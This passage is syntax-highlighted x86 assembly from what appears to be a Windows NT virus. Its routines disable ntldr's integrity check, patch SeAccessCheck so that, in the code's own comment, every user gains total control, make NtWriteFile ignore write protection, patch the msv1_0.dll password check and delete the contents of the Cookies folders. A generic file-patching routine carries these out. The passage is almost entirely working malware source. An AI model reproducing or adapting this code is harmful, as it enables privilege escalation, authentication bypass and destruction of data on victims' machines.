             </span><span class="sc6">div</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RDiv</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RandNb</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; IMPORTANT : this function does a correct job under NT 4</span><span class="sc0">
</span><span class="sc1">; with sevice pack 3, but it might corrupt ntldr and</span><span class="sc0">
</span><span class="sc1">; ntoskrnl under windows 2000 (if they still exist)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">; this patch can only be implemented in administrator mode</span><span class="sc0">


</span><span class="sc5">NukeNTSecurity</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; every time NT starts, ntldr checks ntoskrnl to see</span><span class="sc0">
</span><span class="sc1">; if it hasn't been modified; if so, the system will halt.</span><span class="sc0">
</span><span class="sc1">; this protection must be removed, unless the ntoskrnl patch</span><span class="sc0">
</span><span class="sc1">; won't be accepted</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">PatchSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc2">05</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewFileCheck</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">Patch</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldFileCheck</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">Signature</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NTLDR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">_Filename</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">PatchFile</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; SeAccessCheck returns 00 in al if permission is denied</span><span class="sc0">
</span><span class="sc1">; and 01 if permission is given. When the patch is installed,</span><span class="sc0">
</span><span class="sc1">; the function will automatically return 01. Therefore,</span><span class="sc0">
</span><span class="sc1">; evrey user will gain total control on the whole system.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">PatchSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc2">09</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewSeAccessC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">Patch</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldSeAccessC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">Signature</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NTOSKRNL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">_Filename</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">PatchFile</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">NukeNTLogon</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; All the logon job is done by msgina.dll (which is the real winlogon,</span><span class="sc0">
</span><span class="sc1">; have a look at its InternalName ;-) ). This dll calls msv1_0.dll to</span><span class="sc0">
</span><span class="sc1">; verify the password. But as msv1_0 is loaded in memory, it is</span><span class="sc0">
</span><span class="sc1">; write-protected. So we have to patch again the ntoskrnl NtWriteFile</span><span class="sc0">
</span><span class="sc1">; function, so that it won't care about the write permissions. The next</span><span class="sc0">
</span><span class="sc1">; time NT will start, all dll's (especially msv1_0, but also kernel32)</span><span class="sc0">
</span><span class="sc1">; will be writeable.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">PatchSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc2">07</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewWriteFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">Patch</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldWriteFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">Signature</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NTOSKRNL</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">_Filename</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">PatchFile</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Now just patch that undocumented function</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">PatchSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc2">06</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewLogonTest</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">Patch</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldLogonTest</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">Signature</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MSV1_0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">_Filename</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">PatchFile</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">
             
</span><span class="sc5">PatchFile</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">_Filename</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">20</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_Filename</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">SetFileAttributesA</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">02</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_Filename</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lopen</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OpenRW_Ok</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">00</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_Filename</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lopen</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">ExitPatch</span><span class="sc0">

</span><span class="sc5">OpenRW_Ok</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">ScanFile</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">410</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lread</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">410</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EOF</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc4">-</span><span class="sc2">10</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_llseek</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Signature</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0400</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">Find_Sig</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">PatchSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">cmpsb</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Success</span><span class="sc0">
             </span><span class="sc6">inc</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0">          </span><span class="sc8">edx</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">ScanFile</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Find_Sig</span><span class="sc0">

</span><span class="sc5">Success</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Patch</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">PatchSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsb</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">01</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc4">-</span><span class="sc2">400</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_llseek</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">410</span><span class="sc0">                       
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lwrite</span><span class="sc0">

</span><span class="sc5">EOF</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lclose</span><span class="sc0">

</span><span class="sc5">ExitPatch</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; kills \WINDOWS\Cookies and \WINNT\Cookies</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">NukeCookies</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CookiesDir1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">TrashDirectory</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CookiesDir2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">TrashDirectory</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">TrashDirectory</span><span class="sc4">:</span><span class="sc0">


             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindFirstFileA</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ValidDir</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ValidDir</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">CleanIt</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">DeleteFileA</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindNextFileA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CleanIt</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetEIP</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">@1</span><span class="sc0">

</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; At the moment, other API than the Kernel32 are not supported</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Kernel32_API</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">CreateFileMappingA</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc0">
             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc0">

